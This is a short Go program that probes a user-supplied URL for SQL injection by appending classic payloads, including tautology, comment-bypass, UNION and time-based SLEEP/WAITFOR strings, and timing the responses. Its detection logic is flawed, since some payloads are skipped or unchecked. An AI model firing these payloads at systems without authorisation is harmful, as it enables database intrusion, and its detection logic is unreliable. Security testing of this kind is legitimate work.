package main

import (
	"fmt"
	"net/http"
	"os"
	"time"
	"strings"
	"log"
)

func testSQLInjection(url string) bool {
	payloads := []string{
		"' OR '1'='1",
		"admin'--",
		"' UNION SELECT NULL--",
		"' OR SLEEP(5)--", 
		"' AND sleep(2)", 
		"' OR (SELECT WAITFOR DELAY '0:0:3')--", 
	}

	vulnerable := false

	client := &http.Client{
		Timeout: 10 * time.Second, 
	}

	for _, payload := range payloads {
		fmt.Printf("Testing injection: %s\n", payload)

		if strings.Contains(payload, "SLEEP") || strings.Contains(payload, "WAITFOR") {
			start := time.Now()
			resp, err := client.Get(url + payload)
			if err != nil {
				log.Printf("Error with payload %s: %v\n", payload, err)
				continue
			}
			resp.Body.Close() 
			executionTime := time.Since(start).Seconds()

			if (strings.Contains(payload, "SLEEP") && executionTime > 3) || 
				(strings.Contains(payload, "WAITFOR") && executionTime > 3) {
				vulnerable = true
			}
		} else if !strings.Contains(payload, "UNION") {

			resp, err := client.Get(url + payload)
			if err != nil {
				log.Printf("Error with payload %s: %v\n", payload, err)
				continue
			}
			resp.Body.Close() 
		}
	}

	return vulnerable
}

func main() {
	if len(os.Args) != 2 {
		fmt.Println("Usage: go run web_vuln_test.go <target_url>")
		return
	}

	target := os.Args[1]
	isVulnerable := testSQLInjection(target)

	if isVulnerable {
		fmt.Println("[VULNERABLE] Found potential injection vulnerabilities!")
	} else {
		fmt.Println("No obvious SQL injection points detected.")
	}
}
